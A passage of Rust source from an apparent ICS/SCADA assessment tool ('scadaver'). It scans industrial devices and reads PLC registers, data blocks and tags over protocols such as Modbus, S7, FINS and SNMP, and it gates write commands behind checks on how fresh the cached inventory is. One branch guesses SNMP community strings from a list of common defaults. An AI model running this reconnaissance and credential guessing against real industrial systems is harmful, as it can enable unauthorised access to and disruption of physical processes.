    crate::display::print_info(&format!("Scanning {ip} across all protocolsâ€¦"));
    println!();
    let outcomes = casket::core::autodetect::sweep(ip, timeout);
    for outcome in &outcomes {
        let (tag, detail) = match &outcome.device {
            Some(dev) => ("[+]".green().bold(), summarize_device(dev).normal()),
            None => ("[-]".yellow().bold(), "no response".dimmed()),
        };
        println!(
            "{tag} {:<18} {:<22} {detail}",
            outcome.probe.label, outcome.probe.transport
        );
        if cache {
            if let Some(dev) = &outcome.device {
                let fields = serde_json::to_value(&dev.fields).unwrap_or_default();
                let _ = cache_scan_observation(&dev.ip, &dev.vendor, 0, &fields);
            }
        }
    }
    let responded = outcomes.iter().filter(|o| o.device.is_some()).count();
    println!();
    crate::display::print_success(&format!(
        "{responded}/{} protocol(s) responded.",
        outcomes.len()
    ));
}

fn scan_broadcast(proto: Protocol, timeout: u64) -> Result<()> {
    use crate::net::select_interface;
    use casket::core::network::get_interfaces;
    let ifaces = get_interfaces();
    let iface = select_interface(&ifaces)?;
    crate::ops::scan_broadcast(proto, &iface.name, timeout, &emit_output);
    Ok(())
}

fn emit_output(s: &str) {
    if let Some(msg) = s.strip_prefix("[+] ") {
        crate::display::print_success(msg);
    } else if let Some(msg) = s.strip_prefix("[!] ") {
        crate::display::print_warn(msg);
    } else if let Some(msg) = s.strip_prefix("[-] ") {
        crate::display::print_error(msg);
    } else {
        println!("{s}");
    }
}

#[allow(clippy::unnecessary_wraps)]
fn scan_targeted(ip: &str, port: u16, timeout: u64, proto: Protocol, cache: bool) -> Result<()> {
    if let Some(fields) = crate::ops::scan_ip_report(proto, ip, port, timeout, &emit_output) {
        if cache {
            let vendor = fields["vendor"].as_str().unwrap_or("");
            let p = u16::try_from(fields["port"].as_u64().unwrap_or(0)).unwrap_or(0);
            let _ = cache_scan_observation(ip, vendor, p, &fields);
        }
    }
    Ok(())
}

// ===================================================================
// Get
// ===================================================================

fn resolve_get_protocol(ip: &str, protocol: Option<Protocol>, noun: &GetNoun) -> Result<Protocol> {
    if let Some(protocol) = protocol {
        return Ok(protocol);
    }
    match noun {
        GetNoun::Register { .. }
        | GetNoun::InputRegister { .. }
        | GetNoun::Coil { .. }
        | GetNoun::DiscreteInput { .. } => Ok(Protocol::Modbus),
        GetNoun::Dm { .. } => Ok(Protocol::Omron),
        GetNoun::D { .. } | GetNoun::M { .. } => Ok(Protocol::Mitsubishi),
        GetNoun::EwonRegister { .. } | GetNoun::EwonCoil { .. } => Ok(Protocol::Ewon),
        GetNoun::Io { .. } => Ok(Protocol::Siemens),
        _ => {
            let db = crate::db::Database::open(&crate::db::Database::default_path())?;
            let records = db.load_protocols(ip)?;
            if records.len() == 1 {
                return protocol_from_slug(&records[0].protocol).ok_or_else(|| {
                    anyhow::anyhow!(
                        "Stored protocol '{}' has no CLI mapping; pass --protocol explicitly.",
                        records[0].protocol
                    )
                });
            }
            if records.is_empty() {
                bail!("'--protocol <PROTO>' is required: no cached inventory exists for {ip}.");
            }
            let choices = records
                .iter()
                .map(|record| record.protocol.as_str())
                .collect::<Vec<_>>()
                .join(", ");
            bail!(
                "'--protocol <PROTO>' is required: {ip} has multiple cached protocols ({choices})."
            )
        }
    }
}

fn resolve_set_protocol(protocol: Option<Protocol>, noun: &SetNoun) -> Result<Protocol> {
    if let Some(protocol) = protocol {
        return Ok(protocol);
    }
    match noun {
        SetNoun::Register { .. } | SetNoun::Registers { .. } | SetNoun::Coil { .. } => {
            Ok(Protocol::Modbus)
        }
        SetNoun::Dm { .. } => Ok(Protocol::Omron),
        SetNoun::D { .. } | SetNoun::M { .. } => Ok(Protocol::Mitsubishi),
        SetNoun::EwonRegister { .. } | SetNoun::EwonCoil { .. } => Ok(Protocol::Ewon),
        SetNoun::Output { .. } | SetNoun::Merkers { .. } | SetNoun::Db { .. } => {
            Ok(Protocol::Siemens)
        }
        _ => bail!("'--protocol <PROTO>' is required for this write"),
    }
}

fn set_operation_supported(protocol: Protocol, noun: &SetNoun) -> bool {
    match noun {
        SetNoun::State { .. } => matches!(
            protocol,
            Protocol::Siemens
                | Protocol::Omron
                | Protocol::Beckhoff
                | Protocol::Mitsubishi
                | Protocol::Phoenix
        ),
        SetNoun::Tag { .. } => matches!(
            protocol,
            Protocol::Rockwell
                | Protocol::Beckhoff
                | Protocol::Phoenix
                | Protocol::Mqtt
                | Protocol::Iec104
                | Protocol::Siemens
        ),
        SetNoun::EwonRegister { .. } | SetNoun::EwonCoil { .. } => protocol == Protocol::Ewon,
        SetNoun::Register { .. } | SetNoun::Registers { .. } | SetNoun::Coil { .. } => {
            protocol == Protocol::Modbus
        }
        SetNoun::Output { .. } | SetNoun::Merkers { .. } | SetNoun::Db { .. } => {
            protocol == Protocol::Siemens
        }
        SetNoun::Dm { .. } => protocol == Protocol::Omron,
        SetNoun::D { .. } | SetNoun::M { .. } => protocol == Protocol::Mitsubishi,
        SetNoun::Oid { .. } => protocol == Protocol::Snmp,
        SetNoun::Sc { .. } | SetNoun::Dc { .. } => protocol == Protocol::Iec104,
    }
}

fn mutating_run_protocol(cmd: &RunCmd) -> Option<Protocol> {
    match cmd {
        RunCmd::Reboot | RunCmd::AddUser { .. } | RunCmd::WriteSymbol { .. } => {
            Some(Protocol::Beckhoff)
        }
        RunCmd::FlashLed
        | RunCmd::SessionStop
        | RunCmd::SessionRun
        | RunCmd::Fc90Stop { .. }
        | RunCmd::Fc90Start { .. }
        | RunCmd::Fc90Force { .. } => Some(Protocol::Schneider),
        RunCmd::Fdi { .. } => Some(Protocol::Modbus),
        _ => None,
    }
}

fn ensure_fresh_inventory(ip: &str, protocol: Protocol, confirm_stale: bool) -> Result<()> {
    const STALE_AFTER_SECS: u64 = 48 * 60 * 60;
    let db = crate::db::Database::open(&crate::db::Database::default_path())?;
    let Some(age) = db.protocol_age_secs(ip, protocol_slug(protocol))? else {
        bail!(
            "Refusing write: no saved {} inventory exists for {ip}. Run a successful scan first.",
            protocol_slug(protocol)
        );
    };
    if age > STALE_AFTER_SECS && !confirm_stale {
        bail!(
            "Refusing write: saved {} inventory for {ip} is {} old (limit: 48h). Refresh with --live, or explicitly acknowledge with --confirm-stale.",
            protocol_slug(protocol),
            format_age_secs(age),
        );
    }
    if age > STALE_AFTER_SECS {
        crate::display::print_warn(&format!(
            "Proceeding with {}-old {} inventory because --confirm-stale was supplied.",
            format_age_secs(age),
            protocol_slug(protocol),
        ));
    }
    Ok(())
}

fn resolve_cached_target(
    ip: &str,
    requested_port: u16,
    protocol: Protocol,
    live: bool,
) -> Result<(Protocol, u16, Option<crate::db::ProtocolRecord>)> {
    let db = crate::db::Database::open(&crate::db::Database::default_path())?;
    let record = db.load_protocol(ip, protocol_slug(protocol))?;
    if !live && record.is_none() {
        bail!(
            "No cached {} inventory for {ip}. Run 'scadaver scan --protocol {} -i {ip}' or repeat this command with --live.",
            protocol_slug(protocol),
            protocol_slug(protocol),
        );
    }
    let effective_port = if requested_port != 0 {
        requested_port
    } else {
        record
            .as_ref()
            .and_then(|record| record.port)
            .or_else(|| default_port(Some(protocol)))
            .unwrap_or(0)
    };
    Ok((protocol, effective_port, record))
}

fn resolve_get_target(
    ip: &str,
    requested_port: u16,
    protocol: Protocol,
    noun: &GetNoun,
    live: bool,
) -> Result<(Protocol, u16, Option<crate::db::ProtocolRecord>)> {
    let (protocol, fallback_port, record) =
        resolve_cached_target(ip, requested_port, protocol, live)?;
    if requested_port != 0 {
        return Ok((protocol, fallback_port, record));
    }
    let Some(record) = record else {
        return Ok((protocol, fallback_port, None));
    };
    let endpoint_port = cached_get_port(protocol, noun, &record.fields).unwrap_or(fallback_port);
    Ok((protocol, endpoint_port, Some(record)))
}

fn cached_get_port(protocol: Protocol, noun: &GetNoun, fields: &serde_json::Value) -> Option<u16> {
    let keys: &[&str] = match protocol {
        Protocol::Phoenix if matches!(noun, GetNoun::Tags { .. } | GetNoun::Tag { .. }) => {
            &["webvisit_port", "http_port", "web_port"]
        }
        Protocol::Phoenix => &["phoenix_info_port", "port"],
        Protocol::Ewon if matches!(noun, GetNoun::Tags { .. } | GetNoun::Tag { .. }) => {
            &["ewon_web_port", "web_port", "http_port"]
        }
        Protocol::Ewon
            if matches!(
                noun,
                GetNoun::EwonRegister { .. } | GetNoun::EwonCoil { .. }
            ) =>
        {
            &["ewon_modbus_port", "modbus_port"]
        }
        Protocol::Beckhoff => &["ads_port", "port"],
        Protocol::Mitsubishi => &["slmp_port", "port"],
        Protocol::Omron => &["fins_port", "port"],
        Protocol::Rockwell | Protocol::Enip => &["enip_port", "port"],
        Protocol::Schneider | Protocol::Modbus => &["modbus_port", "port"],
        Protocol::Siemens => &["s7_port", "port"],
        Protocol::Snmp => &["snmp_port", "port"],
        Protocol::Mqtt => &["mqtt_port", "port"],
        Protocol::Iec104 => &["iec104_port", "port"],
        Protocol::Bacnet => &["bacnet_port", "port"],
        Protocol::Dnp3 => &["dnp3_port", "port"],
        Protocol::OpcUa => &["opcua_port", "port"],
        Protocol::Ewon => &["port"],
    };
    keys.iter().find_map(|key| {
        fields[key]
            .as_u64()
            .and_then(|port| u16::try_from(port).ok())
            .or_else(|| fields[key].as_str()?.parse().ok())
    })
}

fn cached_age(last_seen: i64) -> String {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let age = now.saturating_sub(last_seen.cast_unsigned());
    format_age_secs(age)
}

fn format_age_secs(age: u64) -> String {
    if age < 60 {
        format!("{age}s ago")
    } else if age < 3600 {
        format!("{}m ago", age / 60)
    } else if age < 86_400 {
        format!("{}h ago", age / 3600)
    } else {
        format!("{}d ago", age / 86_400)
    }
}

fn print_cached_source(protocol: Protocol, ip: &str, port: u16, last_seen: i64) {
    crate::display::print_info(&format!(
        "Cached {} inventory for {ip}:{port} (recorded {}). Use --live to refresh.",
        protocol_slug(protocol),
        cached_age(last_seen),
    ));
}

#[allow(clippy::too_many_lines)]
fn render_cached_get(
    ip: &str,
    protocol: Protocol,
    port: u16,
    record: Option<&crate::db::ProtocolRecord>,
    noun: &GetNoun,
) -> Result<()> {
    let record = record.ok_or_else(|| anyhow::anyhow!("No cached inventory; use --live"))?;
    print_cached_source(protocol, ip, port, record.last_seen);
    let db = crate::db::Database::open(&crate::db::Database::default_path())?;
    match noun {
        GetNoun::Info => {
            println!(
                "  Protocol: {}",
                crate::display::type_name(&record.protocol)
            );
            for (key, value) in record.fields.as_object().into_iter().flatten() {
                if !value.is_null() && key != "protocols" {
                    println!(
                        "  {key}: {}",
                        crate::display::decoded_value(value.to_string().trim_matches('"'))
                    );
                }
            }
            Ok(())
        }
        GetNoun::Tags { all, .. } if protocol == Protocol::Rockwell => {
            use casket::vendors::rockwell::driver;
            const PREVIEW: usize = 25;
            let tags = db.load_tags_for_protocol(ip, "rockwell")?;
            if tags.is_empty() {
                bail!("No cached Rockwell symbols for {ip}. Run '--live get tags --protocol rockwell -i {ip}'.");
            }
            let mut type_counts = std::collections::BTreeMap::<String, usize>::new();
            let mut rw = 0usize;
            for tag in &tags {
                let tag_type = u16::try_from(tag.tag_type).unwrap_or_default();
                *type_counts.entry(driver::type_name(tag_type)).or_default() += 1;
                if driver::is_writable_type(tag_type) {
                    rw += 1;
                }
            }
            let summary = type_counts
                .iter()
                .map(|(kind, count)| format!("{kind}:{count}"))
                .collect::<Vec<_>>()
                .join(", ");
            println!("  {} tags; {rw} writable; types: {summary}", tags.len());
            let limit = if *all {
                tags.len()
            } else {
                PREVIEW.min(tags.len())
            };
            println!(
                "  {:>5}  {:<32}  {:<18}  {:<24}  Access",
                "ID", "Name", "Type", "Cached value"
            );
            println!("  {}", "â”€".repeat(94));
            for tag in tags.iter().take(limit) {
                let tag_type = u16::try_from(tag.tag_type).unwrap_or_default();
                let indexed_writable = ((tag_type >> 13) & 0x03) == 1
                    && !driver::is_struct_like(tag_type)
                    && driver::is_writable_type(tag_type & !0x6000);
                let access = if indexed_writable {
                    crate::display::text("IDX RW")
                } else {
                    crate::display::access(driver::is_writable_type(tag_type))
                };
                let value = if tag.instance_id < 50_i64 {
                    db.load_data_point(ip, "rockwell", &format!("tag:{}", tag.name))?
                        .and_then(|point| point.last_value)
                        .unwrap_or_else(|| "unavailable".into())
                } else {
                    "not sampled".into()
                };
                println!(
                    "  {:>5}  {}  {}  {}  {}",
                    tag.instance_id,
                    crate::display::tag_name(&pad_to_width(&tag.name, 32)),
                    crate::display::type_name(&pad_to_width(&driver::type_name(tag_type), 18)),
                    crate::display::decoded_value(&pad_to_width(&ellipsize(&value, 24), 24)),
                    access,
                );
            }
            if !*all && tags.len() > limit {
                crate::display::print_info(&format!(
                    "{} additional tag(s) hidden; use --all to list them.",
                    tags.len() - limit
                ));
            }
            let members = db.load_members_for_protocol(ip, "rockwell")?;
            if !members.is_empty() {
                let member_limit = if *all {
                    members.len()
                } else {
                    PREVIEW.min(members.len())
                };
                crate::display::print_info("Cached expanded UDT members and array elements:");
                for member in members.iter().take(member_limit) {
                    let point =
                        db.load_data_point(ip, "rockwell", &format!("tag:{}", member.path))?;
                    let leaf_type = point
                        .as_ref()
                        .and_then(|point| point.data_type.as_deref())
                        .unwrap_or("unknown");
                    let leaf_value = point
                        .as_ref()
                        .and_then(|point| point.last_value.as_deref())
                        .unwrap_or("unavailable");
                    println!(
                        "        â†³ {}  {} = {}  {}",
                        crate::display::tag_name(&pad_to_width(&member.path, 32)),
                        crate::display::type_name(&pad_to_width(leaf_type, 18)),
                        crate::display::decoded_value(&ellipsize(leaf_value, 24)),
                        crate::display::access(member.writable),
                    );
                }
                if members.len() > member_limit {
                    crate::display::print_info(&format!(
                        "{} additional cached UDT member leaf/leaves hidden; use --all.",
                        members.len() - member_limit
                    ));
                }
            }
            Ok(())
        }
        GetNoun::Tags { all, .. } => {
            let points = db.load_data_points(ip, protocol_slug(protocol))?;
            if points.is_empty() {
                bail!(
                    "No cached values for {} on {ip}. Use --live to collect them.",
                    protocol_slug(protocol)
                );
            }
            let limit = if *all {
                points.len()
            } else {
                points.len().min(25)
            };
            for point in points.iter().take(limit) {
                println!(
                    "  {}  {}",
                    crate::display::address(&pad_to_width(&point.address, 28)),
                    crate::display::decoded_value(point.last_value.as_deref().unwrap_or("â€”"))
                );
            }
            if points.len() > limit {
                crate::display::print_info(&format!(
                    "{} additional cached value(s) hidden; use --all.",
                    points.len() - limit
                ));
            }
            Ok(())
        }
        GetNoun::Tag { name, .. } => render_cached_point(&db, ip, protocol, &format!("tag:{name}")),
        GetNoun::Register { start, count } => render_cached_range(
            &db,
            ip,
            protocol,
            "hr",
            u32::from(*start) + 40_001,
            u32::from(*count),
        ),
        GetNoun::InputRegister { start, count } => render_cached_range(
            &db,
            ip,
            protocol,
            "ir",
            u32::from(*start) + 30_001,
            u32::from(*count),
        ),
        GetNoun::Coil { start, count } => render_cached_range(
            &db,
            ip,
            protocol,
            "coil",
            u32::from(*start) + 1,
            u32::from(*count),
        ),
        GetNoun::DiscreteInput { start, count } => render_cached_range(
            &db,
            ip,
            protocol,
            "di",
            u32::from(*start) + 1,
            u32::from(*count),
        ),
        GetNoun::Dm { start, count } => render_cached_range(
            &db,
            ip,
            protocol,
            "dm",
            u32::from(*start),
            u32::from(*count),
        ),
        GetNoun::D { start, count } => {
            render_cached_range(&db, ip, protocol, "d", *start, u32::from(*count))
        }
        GetNoun::M { start, count } => {
            render_cached_range(&db, ip, protocol, "m", *start, u32::from(*count))
        }
        GetNoun::Db {
            db: number,
            offset,
            len,
            ..
        } => render_cached_point(&db, ip, protocol, &format!("db:{number}:{offset}:{len}")),
        GetNoun::EwonRegister { address, .. } => {
            render_cached_point(&db, ip, protocol, &format!("ewon:hr:{address}"))
        }
        GetNoun::EwonCoil { address, .. } => {
            render_cached_point(&db, ip, protocol, &format!("ewon:coil:{address}"))
        }
        _ => bail!("This command has no cached representation yet. Repeat it with --live."),
    }
}

fn render_cached_point(
    db: &crate::db::Database,
    ip: &str,
    protocol: Protocol,
    address: &str,
) -> Result<()> {
    let point = db
        .load_data_point(ip, protocol_slug(protocol), address)?
        .ok_or_else(|| anyhow::anyhow!("No cached value for {address}. Repeat with --live."))?;
    println!(
        "  {} = {}  [{}; {}]",
        crate::display::tag_name(address),
        crate::display::decoded_value(point.last_value.as_deref().unwrap_or("â€”")),
        point.data_type.unwrap_or_else(|| "unknown".into()),
        cached_age(point.last_seen),
    );
    Ok(())
}

fn render_cached_range(
    db: &crate::db::Database,
    ip: &str,
    protocol: Protocol,
    prefix: &str,
    start: u32,
    count: u32,
) -> Result<()> {
    let mut missing = Vec::new();
    for offset in 0..count {
        let address = format!("{prefix}:{}", start + offset);
        match db.load_data_point(ip, protocol_slug(protocol), &address)? {
            Some(point) => println!(
                "  {}  {}",
                crate::display::address(&pad_to_width(&address, 14)),
                crate::display::decoded_value(point.last_value.as_deref().unwrap_or("â€”"))
            ),
            None => missing.push(address),
        }
    }
    if !missing.is_empty() {
        bail!(
            "{} requested value(s) are absent from cache (first: {}). Repeat with --live.",
            missing.len(),
            missing[0]
        );
    }
    Ok(())
}

#[allow(clippy::too_many_lines)]
fn run_get(
    ip: &str,
    port: u16,
    timeout: u64,
    protocol: Option<Protocol>,
    noun: GetNoun,
    live: bool,
    cache: bool,
) -> Result<()> {
    let protocol = resolve_get_protocol(ip, protocol, &noun)?;
    let (protocol, port, record) = resolve_get_target(ip, port, protocol, &noun, live)?;
    if !live {
        return render_cached_get(ip, protocol, port, record.as_ref(), &noun);
    }
    let endpoint_noun = noun.clone();
    let result = match noun {
        GetNoun::Info => get_info(ip, port, timeout, Some(protocol)),
        GetNoun::State => get_state(ip, port, timeout, Some(protocol)),
        GetNoun::Io { password } => get_io(ip, port, timeout, password.as_deref()),
        GetNoun::Tags {
            values,
            all,
            username,
            password,
        } => get_tags(
            ip,
            port,
            timeout,
            Some(protocol),
            values,
            all,
            username,
            password,
            cache,
        ),
        GetNoun::Tag {
            name,
            username,
            password,
        } => get_tag(
            ip,
            port,
            timeout,
            &name,
            Some(protocol),
            username.as_deref(),
            password.as_deref(),
            cache,
        ),
        GetNoun::EwonRegister {
            address,
            r#type,
            unit_id,
        } => get_ewon_register(ip, port, address, r#type, unit_id, cache),
        GetNoun::EwonCoil { address, unit_id } => get_ewon_coil(ip, port, address, unit_id, cache),
        GetNoun::Register { start, count } => {
            use casket::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Reading {count} holding registers from {ip} (start={start})â€¦"
            ));
            let regs = modbus::read_holding_registers(ip, port, start, count)?;
            for r in &regs {
                println!(
                    "  {}  {}",
                    crate::display::address(&format!("{:>6}", r.display_addr)),
                    crate::display::decoded_value(&r.value_str)
                );
            }
            if cache {
                let points: Vec<(String, String)> = regs
                    .iter()
                    .map(|r| (format!("hr:{}", r.display_addr), r.value_str.clone()))
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("UINT16"), value.as_str()))
                    .collect();
                cache_live_points(ip, protocol, port, &refs)?;
            }
            crate::display::print_success(&format!("{} register(s) read.", regs.len()));
            Ok(())
        }
        GetNoun::InputRegister { start, count } => {
            use casket::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Reading {count} input registers from {ip} (start={start})â€¦"
            ));
            let regs = modbus::read_input_registers(ip, port, start, count)?;
            for r in &regs {
                println!(
                    "  {}  {}",
                    crate::display::address(&format!("{:>6}", r.display_addr)),
                    crate::display::decoded_value(&r.value_str)
                );
            }
            if cache {
                let points: Vec<(String, String)> = regs
                    .iter()
                    .map(|r| (format!("ir:{}", r.display_addr), r.value_str.clone()))
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("UINT16"), value.as_str()))
                    .collect();
                cache_live_points(ip, protocol, port, &refs)?;
            }
            crate::display::print_success(&format!("{} register(s) read.", regs.len()));
            Ok(())
        }
        GetNoun::Coil { start, count } => {
            use casket::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Reading {count} coils from {ip} (start={start})â€¦"
            ));
            let regs = modbus::read_coils(ip, port, start, count)?;
            for r in &regs {
                println!(
                    "  {}  {}",
                    crate::display::address(&format!("{:>6}", r.display_addr)),
                    crate::display::boolean(&r.value_str)
                );
            }
            if cache {
                let points: Vec<(String, String)> = regs
                    .iter()
                    .map(|r| (format!("coil:{}", r.display_addr), r.value_str.clone()))
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("BOOL"), value.as_str()))
                    .collect();
                cache_live_points(ip, protocol, port, &refs)?;
            }
            crate::display::print_success(&format!("{} coil(s) read.", regs.len()));
            Ok(())
        }
        GetNoun::DiscreteInput { start, count } => {
            use casket::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Reading {count} discrete inputs from {ip} (start={start})â€¦"
            ));
            let regs = modbus::read_discrete_inputs(ip, port, start, count)?;
            for r in &regs {
                println!(
                    "  {}  {}",
                    crate::display::address(&format!("{:>6}", r.display_addr)),
                    crate::display::boolean(&r.value_str)
                );
            }
            if cache {
                let points: Vec<(String, String)> = regs
                    .iter()
                    .map(|r| (format!("di:{}", r.display_addr), r.value_str.clone()))
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("BOOL"), value.as_str()))
                    .collect();
                cache_live_points(ip, protocol, port, &refs)?;
            }
            crate::display::print_success(&format!("{} discrete input(s) read.", regs.len()));
            Ok(())
        }
        GetNoun::Dm { start, count } => {
            use casket::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            let pb = crate::display::spinner_start(&format!(
                "Reading DM{start}..DM{} from {ip}â€¦",
                start + count - 1
            ));
            let result = fins::read_dm_words(ip, fins_port, 0, start, count);
            pb.finish_and_clear();
            let vals = result?;
            println!("  {:<8}  {:<8}  Hex", "Address", "Dec");
            for (i, &v) in vals.iter().enumerate() {
                let addr = u32::from(start) + u32::try_from(i).unwrap_or(u32::MAX);
                println!(
                    "  {}  {}  {}",
                    crate::display::address(&format!("DM{addr:<6}")),
                    crate::display::numeric(&format!("{v:<8}")),
                    crate::display::raw(&format!("{v:#06x}"))
                );
            }
            if cache {
                let points: Vec<(String, String)> = vals
                    .iter()
                    .enumerate()
                    .map(|(i, value)| {
                        (
                            format!(
                                "dm:{}",
                                u32::from(start) + u32::try_from(i).unwrap_or(u32::MAX)
                            ),
                            value.to_string(),
                        )
                    })
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("UINT16"), value.as_str()))
                    .collect();
                cache_live_points(ip, protocol, fins_port, &refs)?;
            }
            crate::display::print_success(&format!("{} word(s).", vals.len()));
            Ok(())
        }
        GetNoun::Db {
            db,
            offset,
            len,
            password,
        } => {
            use casket::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            let pb =
                crate::display::spinner_start(&format!("Reading DB{db}:{offset}+{len} from {ip}â€¦"));
            let result =
                s7comm::read_data_block(ip, db, offset, len, s7_port, timeout, password.as_deref());
            pb.finish_and_clear();
            let bytes = result?;
            for (i, chunk) in bytes.chunks(16).enumerate() {
                println!(
                    "  {}  {}",
                    crate::display::address(&format!("{:04x}", offset as usize + i * 16)),
                    crate::display::decoded_value(&crate::display::render_bytes(chunk)),
                );
            }
            if cache {
                let address = format!("db:{db}:{offset}:{len}");
                let value = format!(
                    "{} |{}|",
                    hex_encode(&bytes),
                    crate::display::ascii_preview(&bytes)
                );
                cache_live_points(
                    ip,
                    protocol,
                    s7_port,
                    &[(address.as_str(), Some("S7_BYTES"), value.as_str())],
                )?;
            }
            crate::display::print_success(&format!("{} byte(s) from DB{db}.", bytes.len()));
            Ok(())
        }
        GetNoun::D { start, count } => {
            use casket::vendors::mitsubishi::slmp;
            let slmp_port = if port == 0 { 5007 } else { port };
            crate::display::print_info(&format!(
                "Reading {count} D register(s) from {ip} starting at D{start}â€¦"
            ));
            let values = slmp::read_word_devices(ip, slmp_port, "D", start, count)?;
            for value in &values {
                println!(
                    "  {}  {}",
                    crate::display::address(&format!("{:>8}", value.display)),
                    crate::display::decoded_value(&value.value_str)
                );
            }
            if cache {
                let points: Vec<(String, String)> = values
                    .iter()
                    .enumerate()
                    .map(|(i, value)| {
                        (
                            format!("d:{}", start + u32::try_from(i).unwrap_or(u32::MAX)),
                            value.value_str.clone(),
                        )
                    })
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("UINT16"), value.as_str()))
                    .collect();
                cache_live_points(ip, protocol, slmp_port, &refs)?;
            }
            crate::display::print_success(&format!("{} D register(s) read.", values.len()));
            Ok(())
        }
        GetNoun::M { start, count } => {
            use casket::vendors::mitsubishi::slmp;
            let slmp_port = if port == 0 { 5007 } else { port };
            crate::display::print_info(&format!(
                "Reading {count} M bit(s) from {ip} starting at M{start}â€¦"
            ));
            let values = slmp::read_bit_devices(ip, slmp_port, "M", start, count)?;
            for value in &values {
                println!(
                    "  {}  {}",
                    crate::display::address(&format!("{:>8}", value.display)),
                    crate::display::boolean(&value.value_str)
                );
            }
            if cache {
                let points: Vec<(String, String)> = values
                    .iter()
                    .enumerate()
                    .map(|(i, value)| {
                        (
                            format!("m:{}", start + u32::try_from(i).unwrap_or(u32::MAX)),
                            value.value_str.clone(),
                        )
                    })
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("BOOL"), value.as_str()))
                    .collect();
                cache_live_points(ip, protocol, slmp_port, &refs)?;
            }
            crate::display::print_success(&format!("{} M bit(s) read.", values.len()));
            Ok(())
        }
        GetNoun::Community => {
            use casket::vendors::snmp::{client, oids};
            let snmp_port = if port == 0 { 161 } else { port };
            let pb = crate::display::spinner_start(&format!("Scanning communities on {ip}â€¦"));
            let mut found = Vec::new();
            for &c in oids::COMMON_COMMUNITIES {
                if let Ok(val) = client::get(ip, snmp_port, c, oids::SYS_DESCR) {
                    found.push((c, val.display()));
                }
            }
            pb.finish_and_clear();
            if found.is_empty() {
                crate::display::print_warn("No community strings responded.");
            } else {
                for (c, descr) in &found {
                    println!("  community={c:<12}  sysDescr={descr}");
                }
                crate::display::print_success(&format!(
                    "{} community string(s) found.",
                    found.len()
                ));
                if cache {
                    let points: Vec<(String, String)> = found
                        .iter()
                        .map(|(community, descr)| (format!("community:{community}"), descr.clone()))
                        .collect();
                    let refs: Vec<(&str, Option<&str>, &str)> = points
                        .iter()
                        .map(|(address, value)| {
                            (address.as_str(), Some("SNMP_COMMUNITY"), value.as_str())
                        })
                        .collect();
                    cache_live_points(ip, protocol, snmp_port, &refs)?;
                }
            }
            Ok(())
        }
        GetNoun::Oid { oid, community } => {
            use casket::vendors::snmp::client;
            let snmp_port = if port == 0 { 161 } else { port };
            let val = client::get(ip, snmp_port, &community, &oid)?;
            let value = val.display();
            println!("  {oid} = {value}");
            if cache {
                let address = format!("oid:{oid}");
                cache_live_points(
                    ip,
                    protocol,
                    snmp_port,
                    &[(address.as_str(), Some("SNMP"), value.as_str())],
                )?;
            }
            Ok(())
        }
        GetNoun::Walk { oid, community } => {
            use casket::vendors::snmp::client;
            let snmp_port = if port == 0 { 161 } else { port };
            let pb = crate::display::spinner_start(&format!("Walking {oid} on {ip}â€¦"));
            let entries = client::walk(ip, snmp_port, &community, &oid)?;
            pb.finish_and_clear();
            if entries.is_empty() {
                crate::display::print_warn("No results (end of MIB or wrong community).");
            } else {
                for (o, v) in &entries {
                    println!("  {o} = {}", v.display());
                }
                if cache {
                    let points: Vec<(String, String)> = entries
                        .iter()
                        .map(|(entry_oid, value)| (format!("oid:{entry_oid}"), value.display()))
                        .collect();
                    let refs: Vec<(&str, Option<&str>, &str)> = points
                        .iter()
                        .map(|(address, value)| (address.as_str(), Some("SNMP"), value.as_str()))
                        .collect();
                    cache_live_points(ip, protocol, snmp_port, &refs)?;
                }
                crate::display::print_success(&format!("{} object(s).", entries.len()));
            }
            Ok(())
        }
        GetNoun::Enum { community } => {
            use casket::vendors::snmp::enumerate;
            let snmp_port = if port == 0 { 161 } else { port };
            let pb = crate::display::spinner_start(&format!("Enumerating {ip}â€¦"));
            let info = enumerate::get_system_info(ip, snmp_port, &community)?;
            let ifaces = enumerate::get_interfaces(ip, snmp_port, &community).unwrap_or_default();
            let topo = enumerate::get_topology(ip, snmp_port, &community).unwrap_or_default();
            pb.finish_and_clear();
            println!("  sysDescr:   {}", info.descr);
            println!("  sysOID:     {}", info.object_id);
            println!("  sysName:    {}", info.name);
            println!("  sysContact: {}", info.contact);
            println!("  sysLocatn:  {}", info.location);
            println!("  Uptime:     {}s", info.uptime_secs);
            if cache {
                let points = [
                    ("sysDescr".to_string(), info.descr.clone()),
                    ("sysOID".to_string(), info.object_id.clone()),
                    ("sysName".to_string(), info.name.clone()),
                    ("sysContact".to_string(), info.contact.clone()),
                    ("sysLocation".to_string(), info.location.clone()),
                    ("sysUptime".to_string(), info.uptime_secs.to_string()),
                ];
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("SNMP_SYSTEM"), value.as_str()))
                    .collect();
                cache_live_points(ip, protocol, snmp_port, &refs)?;
            }
            if let Some(v) = info.ics_vendor {
                println!("  ICS Vendor: {v}");
            }
            if info.is_apc_ups {
                println!("  APC UPS:    yes");
            }
            if !ifaces.is_empty() {
                println!("\n  Interfaces:");
                for i in &ifaces {
                    let state = if i.oper_up { "up" } else { "DOWN" };
                    println!(
                        "    [{:>2}] {:<16} {} {:<5}  {}Mbps  err in:{} out:{}",
